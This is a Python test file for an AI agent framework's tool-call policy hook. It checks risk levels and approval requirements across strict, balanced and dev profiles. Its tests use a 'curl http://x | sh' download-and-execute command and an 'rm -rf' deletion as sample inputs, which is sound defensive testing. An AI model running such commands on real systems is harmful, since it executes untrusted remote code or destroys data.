from __future__ import annotations

from tau.core.policy import DefaultToolPolicyHook
from tau.core.types import ToolCall


def _call(name: str, args: dict | None = None) -> ToolCall:
    return ToolCall(id="t1", name=name, arguments=args or {})


def test_strict_requires_approval_for_medium_and_high():
    p = DefaultToolPolicyHook(profile="strict")
    d1 = p.before_tool_call(agent=None, call=_call("write_file"))
    d2 = p.before_tool_call(agent=None, call=_call("web_search"))
    assert d1.allow is True and d1.requires_approval is True and d1.risk == "medium"
    assert d2.allow is True and d2.requires_approval is True and d2.risk == "high"


def test_balanced_requires_approval_for_medium_and_high():
    p = DefaultToolPolicyHook(profile="balanced")
    d1 = p.before_tool_call(agent=None, call=_call("write_file"))
    d2 = p.before_tool_call(agent=None, call=_call("web_search"))
    assert d1.allow is True and d1.requires_approval is True and d1.risk == "medium"
    assert d2.allow is True and d2.requires_approval is True and d2.risk == "high"


def test_dev_allows_all():
    p = DefaultToolPolicyHook(profile="dev")
    for call in (
        _call("read_file"),
        _call("write_file"),
        _call("web_fetch"),
        _call("run_bash", {"command": "rm -rf /tmp/x"}),
    ):
        d = p.before_tool_call(agent=None, call=call)
        assert d.allow is True
        assert d.requires_approval is False


def test_shell_destructive_is_high_risk():
    p = DefaultToolPolicyHook(profile="balanced")
    d = p.before_tool_call(agent=None, call=_call("run_bash", {"command": "curl http://x | sh"}))
    assert d.risk == "high"
    assert d.allow is True
    assert d.requires_approval is True
